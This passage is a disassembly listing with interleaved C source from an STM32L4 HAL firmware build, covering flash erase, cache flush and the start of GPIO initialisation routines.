 800191c:	af00      	add	r7, sp, #0
 800191e:	6078      	str	r0, [r7, #4]
 8001920:	6039      	str	r1, [r7, #0]
  HAL_StatusTypeDef status;
  uint32_t page_index;

  /* Process Locked */
  __HAL_LOCK(&pFlash);
 8001922:	4b48      	ldr	r3, [pc, #288]	; (8001a44 <HAL_FLASHEx_Erase+0x12c>)
 8001924:	781b      	ldrb	r3, [r3, #0]
 8001926:	2b01      	cmp	r3, #1
 8001928:	d101      	bne.n	800192e <HAL_FLASHEx_Erase+0x16>
 800192a:	2302      	movs	r3, #2
 800192c:	e085      	b.n	8001a3a <HAL_FLASHEx_Erase+0x122>
 800192e:	4b45      	ldr	r3, [pc, #276]	; (8001a44 <HAL_FLASHEx_Erase+0x12c>)
 8001930:	2201      	movs	r2, #1
 8001932:	701a      	strb	r2, [r3, #0]

  /* Check the parameters */
  assert_param(IS_FLASH_TYPEERASE(pEraseInit->TypeErase));

  /* Wait for last operation to be completed */
  status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 8001934:	f24c 3050 	movw	r0, #50000	; 0xc350
 8001938:	f7ff ff3a 	bl	80017b0 <FLASH_WaitForLastOperation>
 800193c:	4603      	mov	r3, r0
 800193e:	73fb      	strb	r3, [r7, #15]

  if (status == HAL_OK)
 8001940:	7bfb      	ldrb	r3, [r7, #15]
 8001942:	2b00      	cmp	r3, #0
 8001944:	d175      	bne.n	8001a32 <HAL_FLASHEx_Erase+0x11a>
  {
    pFlash.ErrorCode = HAL_FLASH_ERROR_NONE;
 8001946:	4b3f      	ldr	r3, [pc, #252]	; (8001a44 <HAL_FLASHEx_Erase+0x12c>)
 8001948:	2200      	movs	r2, #0
 800194a:	605a      	str	r2, [r3, #4]

    /* Deactivate the cache if they are activated to avoid data misbehavior */
    if(READ_BIT(FLASH->ACR, FLASH_ACR_ICEN) != 0U)
 800194c:	4b3e      	ldr	r3, [pc, #248]	; (8001a48 <HAL_FLASHEx_Erase+0x130>)
 800194e:	681b      	ldr	r3, [r3, #0]
 8001950:	f403 7300 	and.w	r3, r3, #512	; 0x200
 8001954:	2b00      	cmp	r3, #0
 8001956:	d013      	beq.n	8001980 <HAL_FLASHEx_Erase+0x68>
    {
      if(READ_BIT(FLASH->ACR, FLASH_ACR_DCEN) != 0U)
 8001958:	4b3b      	ldr	r3, [pc, #236]	; (8001a48 <HAL_FLASHEx_Erase+0x130>)
 800195a:	681b      	ldr	r3, [r3, #0]
 800195c:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8001960:	2b00      	cmp	r3, #0
 8001962:	d009      	beq.n	8001978 <HAL_FLASHEx_Erase+0x60>
      {
        /* Disable data cache  */
        __HAL_FLASH_DATA_CACHE_DISABLE();
 8001964:	4b38      	ldr	r3, [pc, #224]	; (8001a48 <HAL_FLASHEx_Erase+0x130>)
 8001966:	681b      	ldr	r3, [r3, #0]
 8001968:	4a37      	ldr	r2, [pc, #220]	; (8001a48 <HAL_FLASHEx_Erase+0x130>)
 800196a:	f423 6380 	bic.w	r3, r3, #1024	; 0x400
 800196e:	6013      	str	r3, [r2, #0]
        pFlash.CacheToReactivate = FLASH_CACHE_ICACHE_DCACHE_ENABLED;
 8001970:	4b34      	ldr	r3, [pc, #208]	; (8001a44 <HAL_FLASHEx_Erase+0x12c>)
 8001972:	2203      	movs	r2, #3
 8001974:	771a      	strb	r2, [r3, #28]
 8001976:	e016      	b.n	80019a6 <HAL_FLASHEx_Erase+0x8e>
      }
      else
      {
        pFlash.CacheToReactivate = FLASH_CACHE_ICACHE_ENABLED;
 8001978:	4b32      	ldr	r3, [pc, #200]	; (8001a44 <HAL_FLASHEx_Erase+0x12c>)
 800197a:	2201      	movs	r2, #1
 800197c:	771a      	strb	r2, [r3, #28]
 800197e:	e012      	b.n	80019a6 <HAL_FLASHEx_Erase+0x8e>
      }
    }
    else if(READ_BIT(FLASH->ACR, FLASH_ACR_DCEN) != 0U)
 8001980:	4b31      	ldr	r3, [pc, #196]	; (8001a48 <HAL_FLASHEx_Erase+0x130>)
 8001982:	681b      	ldr	r3, [r3, #0]
 8001984:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8001988:	2b00      	cmp	r3, #0
 800198a:	d009      	beq.n	80019a0 <HAL_FLASHEx_Erase+0x88>
    {
      /* Disable data cache  */
      __HAL_FLASH_DATA_CACHE_DISABLE();
 800198c:	4b2e      	ldr	r3, [pc, #184]	; (8001a48 <HAL_FLASHEx_Erase+0x130>)
 800198e:	681b      	ldr	r3, [r3, #0]
 8001990:	4a2d      	ldr	r2, [pc, #180]	; (8001a48 <HAL_FLASHEx_Erase+0x130>)
 8001992:	f423 6380 	bic.w	r3, r3, #1024	; 0x400
 8001996:	6013      	str	r3, [r2, #0]
      pFlash.CacheToReactivate = FLASH_CACHE_DCACHE_ENABLED;
 8001998:	4b2a      	ldr	r3, [pc, #168]	; (8001a44 <HAL_FLASHEx_Erase+0x12c>)
 800199a:	2202      	movs	r2, #2
 800199c:	771a      	strb	r2, [r3, #28]
 800199e:	e002      	b.n	80019a6 <HAL_FLASHEx_Erase+0x8e>
    }
    else
    {
      pFlash.CacheToReactivate = FLASH_CACHE_DISABLED;
 80019a0:	4b28      	ldr	r3, [pc, #160]	; (8001a44 <HAL_FLASHEx_Erase+0x12c>)
 80019a2:	2200      	movs	r2, #0
 80019a4:	771a      	strb	r2, [r3, #28]
    }

    if (pEraseInit->TypeErase == FLASH_TYPEERASE_MASSERASE)
 80019a6:	687b      	ldr	r3, [r7, #4]
 80019a8:	681b      	ldr	r3, [r3, #0]
 80019aa:	2b01      	cmp	r3, #1
 80019ac:	d111      	bne.n	80019d2 <HAL_FLASHEx_Erase+0xba>
    {
      /* Mass erase to be done */
      FLASH_MassErase(pEraseInit->Banks);
 80019ae:	687b      	ldr	r3, [r7, #4]
 80019b0:	685b      	ldr	r3, [r3, #4]
 80019b2:	4618      	mov	r0, r3
 80019b4:	f000 f84a 	bl	8001a4c <FLASH_MassErase>

      /* Wait for last operation to be completed */
      status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 80019b8:	f24c 3050 	movw	r0, #50000	; 0xc350
 80019bc:	f7ff fef8 	bl	80017b0 <FLASH_WaitForLastOperation>
 80019c0:	4603      	mov	r3, r0
 80019c2:	73fb      	strb	r3, [r7, #15]
    defined (STM32L4R5xx) || defined (STM32L4R7xx) || defined (STM32L4R9xx) || defined (STM32L4S5xx) || defined (STM32L4S7xx) || defined (STM32L4S9xx)
      /* If the erase operation is completed, disable the MER1 and MER2 Bits */
      CLEAR_BIT(FLASH->CR, (FLASH_CR_MER1 | FLASH_CR_MER2));
#else
      /* If the erase operation is completed, disable the MER1 Bit */
      CLEAR_BIT(FLASH->CR, (FLASH_CR_MER1));
 80019c4:	4b20      	ldr	r3, [pc, #128]	; (8001a48 <HAL_FLASHEx_Erase+0x130>)
 80019c6:	695b      	ldr	r3, [r3, #20]
 80019c8:	4a1f      	ldr	r2, [pc, #124]	; (8001a48 <HAL_FLASHEx_Erase+0x130>)
 80019ca:	f023 0304 	bic.w	r3, r3, #4
 80019ce:	6153      	str	r3, [r2, #20]
 80019d0:	e02d      	b.n	8001a2e <HAL_FLASHEx_Erase+0x116>
#endif
    }
    else
    {
      /*Initialization of PageError variable*/
      *PageError = 0xFFFFFFFFU;
 80019d2:	683b      	ldr	r3, [r7, #0]
 80019d4:	f04f 32ff 	mov.w	r2, #4294967295
 80019d8:	601a      	str	r2, [r3, #0]

      for(page_index = pEraseInit->Page; page_index < (pEraseInit->Page + pEraseInit->NbPages); page_index++)
 80019da:	687b      	ldr	r3, [r7, #4]
 80019dc:	689b      	ldr	r3, [r3, #8]
 80019de:	60bb      	str	r3, [r7, #8]
 80019e0:	e01d      	b.n	8001a1e <HAL_FLASHEx_Erase+0x106>
      {
        FLASH_PageErase(page_index, pEraseInit->Banks);
 80019e2:	687b      	ldr	r3, [r7, #4]
 80019e4:	685b      	ldr	r3, [r3, #4]
 80019e6:	4619      	mov	r1, r3
 80019e8:	68b8      	ldr	r0, [r7, #8]
 80019ea:	f000 f84d 	bl	8001a88 <FLASH_PageErase>

        /* Wait for last operation to be completed */
        status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 80019ee:	f24c 3050 	movw	r0, #50000	; 0xc350
 80019f2:	f7ff fedd 	bl	80017b0 <FLASH_WaitForLastOperation>
 80019f6:	4603      	mov	r3, r0
 80019f8:	73fb      	strb	r3, [r7, #15]

        /* If the erase operation is completed, disable the PER Bit */
        CLEAR_BIT(FLASH->CR, (FLASH_CR_PER | FLASH_CR_PNB));
 80019fa:	4b13      	ldr	r3, [pc, #76]	; (8001a48 <HAL_FLASHEx_Erase+0x130>)
 80019fc:	695b      	ldr	r3, [r3, #20]
 80019fe:	4a12      	ldr	r2, [pc, #72]	; (8001a48 <HAL_FLASHEx_Erase+0x130>)
 8001a00:	f423 737e 	bic.w	r3, r3, #1016	; 0x3f8
 8001a04:	f023 0302 	bic.w	r3, r3, #2
 8001a08:	6153      	str	r3, [r2, #20]

        if (status != HAL_OK)
 8001a0a:	7bfb      	ldrb	r3, [r7, #15]
 8001a0c:	2b00      	cmp	r3, #0
 8001a0e:	d003      	beq.n	8001a18 <HAL_FLASHEx_Erase+0x100>
        {
          /* In case of error, stop erase procedure and return the faulty address */
          *PageError = page_index;
 8001a10:	683b      	ldr	r3, [r7, #0]
 8001a12:	68ba      	ldr	r2, [r7, #8]
 8001a14:	601a      	str	r2, [r3, #0]
          break;
 8001a16:	e00a      	b.n	8001a2e <HAL_FLASHEx_Erase+0x116>
      for(page_index = pEraseInit->Page; page_index < (pEraseInit->Page + pEraseInit->NbPages); page_index++)
 8001a18:	68bb      	ldr	r3, [r7, #8]
 8001a1a:	3301      	adds	r3, #1
 8001a1c:	60bb      	str	r3, [r7, #8]
 8001a1e:	687b      	ldr	r3, [r7, #4]
 8001a20:	689a      	ldr	r2, [r3, #8]
 8001a22:	687b      	ldr	r3, [r7, #4]
 8001a24:	68db      	ldr	r3, [r3, #12]
 8001a26:	4413      	add	r3, r2
 8001a28:	68ba      	ldr	r2, [r7, #8]
 8001a2a:	429a      	cmp	r2, r3
 8001a2c:	d3d9      	bcc.n	80019e2 <HAL_FLASHEx_Erase+0xca>
        }
      }
    }

    /* Flush the caches to be sure of the data consistency */
    FLASH_FlushCaches();
 8001a2e:	f000 f84f 	bl	8001ad0 <FLASH_FlushCaches>
  }

  /* Process Unlocked */
  __HAL_UNLOCK(&pFlash);
 8001a32:	4b04      	ldr	r3, [pc, #16]	; (8001a44 <HAL_FLASHEx_Erase+0x12c>)
 8001a34:	2200      	movs	r2, #0
 8001a36:	701a      	strb	r2, [r3, #0]

  return status;
 8001a38:	7bfb      	ldrb	r3, [r7, #15]
}
 8001a3a:	4618      	mov	r0, r3
 8001a3c:	3710      	adds	r7, #16
 8001a3e:	46bd      	mov	sp, r7
 8001a40:	bd80      	pop	{r7, pc}
 8001a42:	bf00      	nop
 8001a44:	2000000c 	.word	0x2000000c
 8001a48:	40022000 	.word	0x40022000

08001a4c <FLASH_MassErase>:
  *            @arg FLASH_BANK_2: Bank2 to be erased
  *            @arg FLASH_BANK_BOTH: Bank1 and Bank2 to be erased
  * @retval None
  */
static void FLASH_MassErase(uint32_t Banks)
{
 8001a4c:	b480      	push	{r7}
 8001a4e:	b083      	sub	sp, #12
 8001a50:	af00      	add	r7, sp, #0
 8001a52:	6078      	str	r0, [r7, #4]
  {
    /* Check the parameters */
    assert_param(IS_FLASH_BANK(Banks));

    /* Set the Mass Erase Bit for the bank 1 if requested */
    if((Banks & FLASH_BANK_1) != 0U)
 8001a54:	687b      	ldr	r3, [r7, #4]
 8001a56:	f003 0301 	and.w	r3, r3, #1
 8001a5a:	2b00      	cmp	r3, #0
 8001a5c:	d005      	beq.n	8001a6a <FLASH_MassErase+0x1e>
    {
      SET_BIT(FLASH->CR, FLASH_CR_MER1);
 8001a5e:	4b09      	ldr	r3, [pc, #36]	; (8001a84 <FLASH_MassErase+0x38>)
 8001a60:	695b      	ldr	r3, [r3, #20]
 8001a62:	4a08      	ldr	r2, [pc, #32]	; (8001a84 <FLASH_MassErase+0x38>)
 8001a64:	f043 0304 	orr.w	r3, r3, #4
 8001a68:	6153      	str	r3, [r2, #20]
    SET_BIT(FLASH->CR, (FLASH_CR_MER1 | FLASH_CR_MER2));
  }
#endif

  /* Proceed to erase all sectors */
  SET_BIT(FLASH->CR, FLASH_CR_STRT);
 8001a6a:	4b06      	ldr	r3, [pc, #24]	; (8001a84 <FLASH_MassErase+0x38>)
 8001a6c:	695b      	ldr	r3, [r3, #20]
 8001a6e:	4a05      	ldr	r2, [pc, #20]	; (8001a84 <FLASH_MassErase+0x38>)
 8001a70:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8001a74:	6153      	str	r3, [r2, #20]
}
 8001a76:	bf00      	nop
 8001a78:	370c      	adds	r7, #12
 8001a7a:	46bd      	mov	sp, r7
 8001a7c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001a80:	4770      	bx	lr
 8001a82:	bf00      	nop
 8001a84:	40022000 	.word	0x40022000

08001a88 <FLASH_PageErase>:
  *            @arg FLASH_BANK_1: Page in bank 1 to be erased
  *            @arg FLASH_BANK_2: Page in bank 2 to be erased
  * @retval None
  */
void FLASH_PageErase(uint32_t Page, uint32_t Banks)
{
 8001a88:	b480      	push	{r7}
 8001a8a:	b083      	sub	sp, #12
 8001a8c:	af00      	add	r7, sp, #0
 8001a8e:	6078      	str	r0, [r7, #4]
 8001a90:	6039      	str	r1, [r7, #0]
  /* Prevent unused argument(s) compilation warning */
  UNUSED(Banks);
#endif

  /* Proceed to erase the page */
  MODIFY_REG(FLASH->CR, FLASH_CR_PNB, ((Page & 0xFFU) << FLASH_CR_PNB_Pos));
 8001a92:	4b0e      	ldr	r3, [pc, #56]	; (8001acc <FLASH_PageErase+0x44>)
 8001a94:	695b      	ldr	r3, [r3, #20]
 8001a96:	f423 727e 	bic.w	r2, r3, #1016	; 0x3f8
 8001a9a:	687b      	ldr	r3, [r7, #4]
 8001a9c:	00db      	lsls	r3, r3, #3
 8001a9e:	f403 63ff 	and.w	r3, r3, #2040	; 0x7f8
 8001aa2:	490a      	ldr	r1, [pc, #40]	; (8001acc <FLASH_PageErase+0x44>)
 8001aa4:	4313      	orrs	r3, r2
 8001aa6:	614b      	str	r3, [r1, #20]
  SET_BIT(FLASH->CR, FLASH_CR_PER);
 8001aa8:	4b08      	ldr	r3, [pc, #32]	; (8001acc <FLASH_PageErase+0x44>)
 8001aaa:	695b      	ldr	r3, [r3, #20]
 8001aac:	4a07      	ldr	r2, [pc, #28]	; (8001acc <FLASH_PageErase+0x44>)
 8001aae:	f043 0302 	orr.w	r3, r3, #2
 8001ab2:	6153      	str	r3, [r2, #20]
  SET_BIT(FLASH->CR, FLASH_CR_STRT);
 8001ab4:	4b05      	ldr	r3, [pc, #20]	; (8001acc <FLASH_PageErase+0x44>)
 8001ab6:	695b      	ldr	r3, [r3, #20]
 8001ab8:	4a04      	ldr	r2, [pc, #16]	; (8001acc <FLASH_PageErase+0x44>)
 8001aba:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8001abe:	6153      	str	r3, [r2, #20]
}
 8001ac0:	bf00      	nop
 8001ac2:	370c      	adds	r7, #12
 8001ac4:	46bd      	mov	sp, r7
 8001ac6:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001aca:	4770      	bx	lr
 8001acc:	40022000 	.word	0x40022000

08001ad0 <FLASH_FlushCaches>:
/**
  * @brief  Flush the instruction and data caches.
  * @retval None
  */
void FLASH_FlushCaches(void)
{
 8001ad0:	b480      	push	{r7}
 8001ad2:	b083      	sub	sp, #12
 8001ad4:	af00      	add	r7, sp, #0
  FLASH_CacheTypeDef cache = pFlash.CacheToReactivate;
 8001ad6:	4b21      	ldr	r3, [pc, #132]	; (8001b5c <FLASH_FlushCaches+0x8c>)
 8001ad8:	7f1b      	ldrb	r3, [r3, #28]
 8001ada:	71fb      	strb	r3, [r7, #7]

  /* Flush instruction cache  */
  if((cache == FLASH_CACHE_ICACHE_ENABLED) ||
 8001adc:	79fb      	ldrb	r3, [r7, #7]
 8001ade:	2b01      	cmp	r3, #1
 8001ae0:	d002      	beq.n	8001ae8 <FLASH_FlushCaches+0x18>
 8001ae2:	79fb      	ldrb	r3, [r7, #7]
 8001ae4:	2b03      	cmp	r3, #3
 8001ae6:	d117      	bne.n	8001b18 <FLASH_FlushCaches+0x48>
     (cache == FLASH_CACHE_ICACHE_DCACHE_ENABLED))
  {
    /* Disable instruction cache */
    __HAL_FLASH_INSTRUCTION_CACHE_DISABLE();
 8001ae8:	4b1d      	ldr	r3, [pc, #116]	; (8001b60 <FLASH_FlushCaches+0x90>)
 8001aea:	681b      	ldr	r3, [r3, #0]
 8001aec:	4a1c      	ldr	r2, [pc, #112]	; (8001b60 <FLASH_FlushCaches+0x90>)
 8001aee:	f423 7300 	bic.w	r3, r3, #512	; 0x200
 8001af2:	6013      	str	r3, [r2, #0]
    /* Reset instruction cache */
    __HAL_FLASH_INSTRUCTION_CACHE_RESET();
 8001af4:	4b1a      	ldr	r3, [pc, #104]	; (8001b60 <FLASH_FlushCaches+0x90>)
 8001af6:	681b      	ldr	r3, [r3, #0]
 8001af8:	4a19      	ldr	r2, [pc, #100]	; (8001b60 <FLASH_FlushCaches+0x90>)
 8001afa:	f443 6300 	orr.w	r3, r3, #2048	; 0x800
 8001afe:	6013      	str	r3, [r2, #0]
 8001b00:	4b17      	ldr	r3, [pc, #92]	; (8001b60 <FLASH_FlushCaches+0x90>)
 8001b02:	681b      	ldr	r3, [r3, #0]
 8001b04:	4a16      	ldr	r2, [pc, #88]	; (8001b60 <FLASH_FlushCaches+0x90>)
 8001b06:	f423 6300 	bic.w	r3, r3, #2048	; 0x800
 8001b0a:	6013      	str	r3, [r2, #0]
    /* Enable instruction cache */
    __HAL_FLASH_INSTRUCTION_CACHE_ENABLE();
 8001b0c:	4b14      	ldr	r3, [pc, #80]	; (8001b60 <FLASH_FlushCaches+0x90>)
 8001b0e:	681b      	ldr	r3, [r3, #0]
 8001b10:	4a13      	ldr	r2, [pc, #76]	; (8001b60 <FLASH_FlushCaches+0x90>)
 8001b12:	f443 7300 	orr.w	r3, r3, #512	; 0x200
 8001b16:	6013      	str	r3, [r2, #0]
  }

  /* Flush data cache */
  if((cache == FLASH_CACHE_DCACHE_ENABLED) ||
 8001b18:	79fb      	ldrb	r3, [r7, #7]
 8001b1a:	2b02      	cmp	r3, #2
 8001b1c:	d002      	beq.n	8001b24 <FLASH_FlushCaches+0x54>
 8001b1e:	79fb      	ldrb	r3, [r7, #7]
 8001b20:	2b03      	cmp	r3, #3
 8001b22:	d111      	bne.n	8001b48 <FLASH_FlushCaches+0x78>
     (cache == FLASH_CACHE_ICACHE_DCACHE_ENABLED))
  {
    /* Reset data cache */
    __HAL_FLASH_DATA_CACHE_RESET();
 8001b24:	4b0e      	ldr	r3, [pc, #56]	; (8001b60 <FLASH_FlushCaches+0x90>)
 8001b26:	681b      	ldr	r3, [r3, #0]
 8001b28:	4a0d      	ldr	r2, [pc, #52]	; (8001b60 <FLASH_FlushCaches+0x90>)
 8001b2a:	f443 5380 	orr.w	r3, r3, #4096	; 0x1000
 8001b2e:	6013      	str	r3, [r2, #0]
 8001b30:	4b0b      	ldr	r3, [pc, #44]	; (8001b60 <FLASH_FlushCaches+0x90>)
 8001b32:	681b      	ldr	r3, [r3, #0]
 8001b34:	4a0a      	ldr	r2, [pc, #40]	; (8001b60 <FLASH_FlushCaches+0x90>)
 8001b36:	f423 5380 	bic.w	r3, r3, #4096	; 0x1000
 8001b3a:	6013      	str	r3, [r2, #0]
    /* Enable data cache */
    __HAL_FLASH_DATA_CACHE_ENABLE();
 8001b3c:	4b08      	ldr	r3, [pc, #32]	; (8001b60 <FLASH_FlushCaches+0x90>)
 8001b3e:	681b      	ldr	r3, [r3, #0]
 8001b40:	4a07      	ldr	r2, [pc, #28]	; (8001b60 <FLASH_FlushCaches+0x90>)
 8001b42:	f443 6380 	orr.w	r3, r3, #1024	; 0x400
 8001b46:	6013      	str	r3, [r2, #0]
  }

  /* Reset internal variable */
  pFlash.CacheToReactivate = FLASH_CACHE_DISABLED;
 8001b48:	4b04      	ldr	r3, [pc, #16]	; (8001b5c <FLASH_FlushCaches+0x8c>)
 8001b4a:	2200      	movs	r2, #0
 8001b4c:	771a      	strb	r2, [r3, #28]
}
 8001b4e:	bf00      	nop
 8001b50:	370c      	adds	r7, #12
 8001b52:	46bd      	mov	sp, r7
 8001b54:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001b58:	4770      	bx	lr
 8001b5a:	bf00      	nop
 8001b5c:	2000000c 	.word	0x2000000c
 8001b60:	40022000 	.word	0x40022000

08001b64 <HAL_GPIO_Init>:
  * @param  GPIO_Init pointer to a GPIO_InitTypeDef structure that contains
  *         the configuration information for the specified GPIO peripheral.
  * @retval None
  */
void HAL_GPIO_Init(GPIO_TypeDef  *GPIOx, GPIO_InitTypeDef *GPIO_Init)
{
 8001b64:	b480      	push	{r7}
 8001b66:	b087      	sub	sp, #28
 8001b68:	af00      	add	r7, sp, #0
 8001b6a:	6078      	str	r0, [r7, #4]
 8001b6c:	6039      	str	r1, [r7, #0]
  uint32_t position = 0x00u;
 8001b6e:	2300      	movs	r3, #0
 8001b70:	617b      	str	r3, [r7, #20]
  assert_param(IS_GPIO_ALL_INSTANCE(GPIOx));
  assert_param(IS_GPIO_PIN(GPIO_Init->Pin));
  assert_param(IS_GPIO_MODE(GPIO_Init->Mode));

  /* Configure the port pins */
  while (((GPIO_Init->Pin) >> position) != 0x00u)
 8001b72:	e148      	b.n	8001e06 <HAL_GPIO_Init+0x2a2>
  {
    /* Get current io position */
    iocurrent = (GPIO_Init->Pin) & (1uL << position);
 8001b74:	683b      	ldr	r3, [r7, #0]
 8001b76:	681a      	ldr	r2, [r3, #0]
 8001b78:	2101      	movs	r1, #1
 8001b7a:	697b      	ldr	r3, [r7, #20]
 8001b7c:	fa01 f303 	lsl.w	r3, r1, r3
 8001b80:	4013      	ands	r3, r2
 8001b82:	60fb      	str	r3, [r7, #12]

    if (iocurrent != 0x00u)
 8001b84:	68fb      	ldr	r3, [r7, #12]
 8001b86:	2b00      	cmp	r3, #0
 8001b88:	f000 813a 	beq.w	8001e00 <HAL_GPIO_Init+0x29c>
    {
      /*--------------------- GPIO Mode Configuration ------------------------*/
      /* In case of Output or Alternate function mode selection */
      if (((GPIO_Init->Mode & GPIO_MODE) == MODE_OUTPUT) || ((GPIO_Init->Mode & GPIO_MODE) == MODE_AF))
 8001b8c:	683b      	ldr	r3, [r7, #0]
 8001b8e:	685b      	ldr	r3, [r3, #4]
 8001b90:	f003 0303 	and.w	r3, r3, #3
 8001b94:	2b01      	cmp	r3, #1
 8001b96:	d005      	beq.n	8001ba4 <HAL_GPIO_Init+0x40>
 8001b98:	683b      	ldr	r3, [r7, #0]
 8001b9a:	685b      	ldr	r3, [r3, #4]
 8001b9c:	f003 0303 	and.w	r3, r3, #3
 8001ba0:	2b02      	cmp	r3, #2
 8001ba2:	d130      	bne.n	8001c06 <HAL_GPIO_Init+0xa2>
      {
        /* Check the Speed parameter */
        assert_param(IS_GPIO_SPEED(GPIO_Init->Speed));

        /* Configure the IO Speed */
        temp = GPIOx->OSPEEDR;
 8001ba4:	687b      	ldr	r3, [r7, #4]
 8001ba6:	689b      	ldr	r3, [r3, #8]
 8001ba8:	613b      	str	r3, [r7, #16]
        temp &= ~(GPIO_OSPEEDR_OSPEED0 << (position * 2u));
 8001baa:	697b      	ldr	r3, [r7, #20]
 8001bac:	005b      	lsls	r3, r3, #1
 8001bae:	2203      	movs	r2, #3
 8001bb0:	fa02 f303 	lsl.w	r3, r2, r3
 8001bb4:	43db      	mvns	r3, r3
 8001bb6:	693a      	ldr	r2, [r7, #16]
 8001bb8:	4013      	ands	r3, r2
 8001bba:	613b      	str	r3, [r7, #16]
        temp |= (GPIO_Init->Speed << (position * 2u));
 8001bbc:	683b      	ldr	r3, [r7, #0]
 8001bbe:	68da      	ldr	r2, [r3, #12]
 8001bc0:	697b      	ldr	r3, [r7, #20]
 8001bc2:	005b      	lsls	r3, r3, #1
 8001bc4:	fa02 f303 	lsl.w	r3, r2, r3
 8001bc8:	693a      	ldr	r2, [r7, #16]
 8001bca:	4313      	orrs	r3, r2
 8001bcc:	613b      	str	r3, [r7, #16]
        GPIOx->OSPEEDR = temp;
 8001bce:	687b      	ldr	r3, [r7, #4]
 8001bd0:	693a      	ldr	r2, [r7, #16]
 8001bd2:	609a      	str	r2, [r3, #8]

        /* Configure the IO Output Type */
        temp = GPIOx->OTYPER;
 8001bd4:	687b      	ldr	r3, [r7, #4]
 8001bd6:	685b      	ldr	r3, [r3, #4]
 8001bd8:	613b      	str	r3, [r7, #16]
        temp &= ~(GPIO_OTYPER_OT0 << position) ;
 8001bda:	2201      	movs	r2, #1
 8001bdc:	697b      	ldr	r3, [r7, #20]
 8001bde:	fa02 f303 	lsl.w	r3, r2, r3
 8001be2:	43db      	mvns	r3, r3
 8001be4:	693a      	ldr	r2, [r7, #16]
 8001be6:	4013      	ands	r3, r2
 8001be8:	613b      	str	r3, [r7, #16]
        temp |= (((GPIO_Init->Mode & OUTPUT_TYPE) >> OUTPUT_TYPE_Pos) << position);
 8001bea:	683b      	ldr	r3, [r7, #0]
 8001bec:	685b      	ldr	r3, [r3, #4]
 8001bee:	091b      	lsrs	r3, r3, #4
 8001bf0:	f003 0201 	and.w	r2, r3, #1
 8001bf4:	697b      	ldr	r3, [r7, #20]
 8001bf6:	fa02 f303 	lsl.w	r3, r2, r3
 8001bfa:	693a      	ldr	r2, [r7, #16]
 8001bfc:	4313      	orrs	r3, r2
 8001bfe:	613b      	str	r3, [r7, #16]
        GPIOx->OTYPER = temp;
 8001c00:	687b      	ldr	r3, [r7, #4]
 8001c02:	693a      	ldr	r2, [r7, #16]
 8001c04:	605a      	str	r2, [r3, #4]
      }

#endif /* STM32L471xx || STM32L475xx || STM32L476xx || STM32L485xx || STM32L486xx */

      /* Activate the Pull-up or Pull down resistor for the current IO */
      if ((GPIO_Init->Mode & GPIO_MODE) != MODE_ANALOG)
 8001c06:	683b      	ldr	r3, [r7, #0]
 8001c08:	685b      	ldr	r3, [r3, #4]
 8001c0a:	f003 0303 	and.w	r3, r3, #3
 8001c0e:	2b03      	cmp	r3, #3
 8001c10:	d017      	beq.n	8001c42 <HAL_GPIO_Init+0xde>
      {
        /* Check the Pull parameter */
        assert_param(IS_GPIO_PULL(GPIO_Init->Pull));

        temp = GPIOx->PUPDR;
 8001c12:	687b      	ldr	r3, [r7, #4]
 8001c14:	68db      	ldr	r3, [r3, #12]
 8001c16:	613b      	str	r3, [r7, #16]
        temp &= ~(GPIO_PUPDR_PUPD0 << (position * 2U));
 8001c18:	697b      	ldr	r3, [r7, #20]
 8001c1a:	005b      	lsls	r3, r3, #1
 8001c1c:	2203      	movs	r2, #3
 8001c1e:	fa02 f303 	lsl.w	r3, r2, r3
 8001c22:	43db      	mvns	r3, r3
 8001c24:	693a      	ldr	r2, [r7, #16]
 8001c26:	4013      	ands	r3, r2
 8001c28:	613b      	str	r3, [r7, #16]
        temp |= ((GPIO_Init->Pull) << (position * 2U));
 8001c2a:	683b      	ldr	r3, [r7, #0]
 8001c2c:	689a      	ldr	r2, [r3, #8]
 8001c2e:	697b      	ldr	r3, [r7, #20]
 8001c30:	005b      	lsls	r3, r3, #1
 8001c32:	fa02 f303 	lsl.w	r3, r2, r3
 8001c36:	693a      	ldr	r2, [r7, #16]
 8001c38:	4313      	orrs	r3, r2
 8001c3a:	613b      	str	r3, [r7, #16]
        GPIOx->PUPDR = temp;
 8001c3c:	687b      	ldr	r3, [r7, #4]
 8001c3e:	693a      	ldr	r2, [r7, #16]
 8001c40:	60da      	str	r2, [r3, #12]
      }

      /* In case of Alternate function mode selection */
      if ((GPIO_Init->Mode & GPIO_MODE) == MODE_AF)
 8001c42:	683b      	ldr	r3, [r7, #0]
 8001c44:	685b      	ldr	r3, [r3, #4]
 8001c46:	f003 0303 	and.w	r3, r3, #3
 8001c4a:	2b02      	cmp	r3, #2
 8001c4c:	d123      	bne.n	8001c96 <HAL_GPIO_Init+0x132>
        /* Check the Alternate function parameters */
        assert_param(IS_GPIO_AF_INSTANCE(GPIOx));
        assert_param(IS_GPIO_AF(GPIO_Init->Alternate));

        /* Configure Alternate function mapped with the current IO */
        temp = GPIOx->AFR[position >> 3u];
 8001c4e:	697b      	ldr	r3, [r7, #20]
 8001c50:	08da      	lsrs	r2, r3, #3
 8001c52:	687b      	ldr	r3, [r7, #4]
 8001c54:	3208      	adds	r2, #8
 8001c56:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8001c5a:	613b      	str	r3, [r7, #16]
        temp &= ~(0xFu << ((position & 0x07u) * 4u));
 8001c5c:	697b      	ldr	r3, [r7, #20]
 8001c5e:	f003 0307 	and.w	r3, r3, #7
 8001c62:	009b      	lsls	r3, r3, #2
 8001c64:	220f      	movs	r2, #15
 8001c66:	fa02 f303 	lsl.w	r3, r2, r3
 8001c6a:	43db      	mvns	r3, r3
 8001c6c:	693a      	ldr	r2, [r7, #16]
 8001c6e:	4013      	ands	r3, r2
 8001c70:	613b      	str	r3, [r7, #16]
        temp |= ((GPIO_Init->Alternate) << ((position & 0x07u) * 4u));
 8001c72:	683b      	ldr	r3, [r7, #0]
 8001c74:	691a      	ldr	r2, [r3, #16]
 8001c76:	697b      	ldr	r3, [r7, #20]
 8001c78:	f003 0307 	and.w	r3, r3, #7
